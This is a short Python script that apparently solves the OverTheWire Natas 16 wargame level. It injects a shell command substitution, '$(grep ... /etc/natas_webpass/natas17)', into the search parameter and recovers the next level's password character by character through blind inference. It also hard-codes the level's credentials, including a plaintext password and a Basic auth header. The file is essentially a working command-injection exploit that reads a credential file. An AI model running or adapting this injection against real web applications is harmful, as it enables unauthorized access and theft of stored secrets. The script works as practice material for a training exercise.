#!/usr/bin/env python
# -*- coding: utf-8 -*-

import requests

# 'username': "natas15"
# 'password': "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J"

def is_true(s):
    injected = "$(grep " + s + " /etc/natas_webpass/natas17)injections"
    url = "http://natas16.natas.labs.overthewire.org?needle=" + injected + "&submit=Search"
    # print "Testing", url
    headers = {"Authorization": "Basic bmF0YXMxNjpXYUlIRWFjajYzd25OSUJST0hlcWkzcDl0MG01bmhtaA=="}
    r = requests.get(url, headers=headers )

    # print r.text
    if "injections" not in r.text:
        return True

# chars = ""
#  i in map(chr, range(65, 91) + range(97,123) + range(48, 58)):
#  "Testing:", i
#  is_true(i):
#  = chars + i
#  "Found",chars
#  chars

chars = "AGHNPQSWbcdghkmnqrsw035789"
passwd = "^"
while len(passwd) < 32:
    for c in chars:
        if is_true(passwd + c):
            passwd = passwd + c
            print passwd
